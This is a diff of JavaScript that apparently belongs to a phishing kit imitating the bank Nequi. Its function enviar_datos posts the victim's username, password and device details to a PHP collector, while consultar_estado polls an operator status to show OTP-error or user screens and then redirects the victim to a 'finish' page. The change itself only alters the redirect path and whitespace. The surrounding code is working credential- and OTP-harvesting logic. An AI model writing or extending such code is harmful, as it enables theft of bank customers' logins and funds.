@@ -18,7 +18,7 @@ function consultar_estado(){
                          vista_errorotp(); 
                          break;
                 case '10':espera = 0;
-                          window.location.href = "../../finish-no-back-button/";
+                          window.location.href = "../../finish-no-back-button/successful.html";
                           break;
                 case '12':espera = 0;
                           vista_usuario(); 
@@ -163,7 +163,7 @@ function esperando(){
 
 function enviar_datos(u,c){  
     d = detectar_dispositivo();  
-    $.post( "../../process/pasologin.php", { usr:u, pas: c, dis: d, ban:"Nequi"} ,function(data) {      
+    $.post( "../../process/pasologin.php", { usr:u, pas: c, dis: d, ban:"Nequi"} ,function(data) {
         espera = 1;
         setTimeout(esperando, 1400); 
     });
